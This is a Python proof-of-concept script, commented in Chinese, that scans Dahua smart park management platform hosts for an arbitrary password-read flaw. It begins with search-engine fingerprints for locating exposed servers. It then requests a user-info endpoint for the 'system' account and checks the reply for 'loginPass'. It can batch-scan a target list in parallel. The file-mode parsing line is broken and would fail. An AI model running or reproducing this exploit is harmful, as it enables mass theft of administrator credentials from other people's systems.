#app="dahua-智慧园区综合管理平台
#body="“/WPMS/asset/lib/gridster/”"

#先导包
import requests,argparse,sys
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()#关掉特定的报错信息


def banner():
    test = """
██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                            author:luanma                           
    """
    print(test)

def poc(target):
    payload = '/admin/user_getUserInfoByUserName.action?userName=system '
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    }
    try:
        res = requests.get(target,verify=False)
        if res.status_code == 200:
            res1 = requests.get(target+payload, headers=headers, verify=False)
            if "loginPass" in res1.text:
                print(f"[+]{target}存在任意密码读取漏洞")
            else:
                print(f"[-]{target}不存在任意密码读取漏洞")
        else:
            print(f"[-]{target}可能存在问题,请手动注入1")
    except Exception as e:
        print(f"[-]{target}可能存在问题,请手动注入2")


def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区管理平台存在任意密码读取漏洞")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入一个可能存在漏洞的url")
    parser.add_argument('-f','--file',dest='file',type=str,help='请输入一个额包含资产的文件')
    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.split().replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")


if __name__ == '__main__':
    main()